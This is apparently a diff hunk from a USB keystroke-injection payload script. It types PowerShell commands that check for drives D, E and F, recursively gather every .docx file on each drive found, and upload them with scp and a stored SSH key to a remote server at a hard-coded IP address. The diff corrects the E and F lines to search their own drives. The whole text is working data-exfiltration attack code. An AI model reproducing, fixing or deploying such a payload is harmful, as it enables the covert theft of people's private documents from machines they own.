@@ -92,9 +92,9 @@ DELAY 10000
 STRING if ((Get-PSDrive -PSProvider FileSystem | %{$_.Name}) -contains "D") {scp -i ~\.ssh\Key $(Get-ChildItem -Path D:\ -Filter *.docx -Recurse | %{$_.FullName}) ubuntu@16.170.236.72:/home/ubuntu/download}
 ENTER
 DELAY 10000
-STRING if ((Get-PSDrive -PSProvider FileSystem | %{$_.Name}) -contains "E") {scp -i ~\.ssh\Key $(Get-ChildItem -Path D:\ -Filter *.docx -Recurse | %{$_.FullName}) ubuntu@16.170.236.72:/home/ubuntu/download}
+STRING if ((Get-PSDrive -PSProvider FileSystem | %{$_.Name}) -contains "E") {scp -i ~\.ssh\Key $(Get-ChildItem -Path E:\ -Filter *.docx -Recurse | %{$_.FullName}) ubuntu@16.170.236.72:/home/ubuntu/download}
 ENTER
 DELAY 10000
-STRING if ((Get-PSDrive -PSProvider FileSystem | %{$_.Name}) -contains "F") {scp -i ~\.ssh\Key $(Get-ChildItem -Path D:\ -Filter *.docx -Recurse | %{$_.FullName}) ubuntu@16.170.236.72:/home/ubuntu/download}
+STRING if ((Get-PSDrive -PSProvider FileSystem | %{$_.Name}) -contains "F") {scp -i ~\.ssh\Key $(Get-ChildItem -Path F:\ -Filter *.docx -Recurse | %{$_.FullName}) ubuntu@16.170.236.72:/home/ubuntu/download}
 ENTER
 DELAY 10000
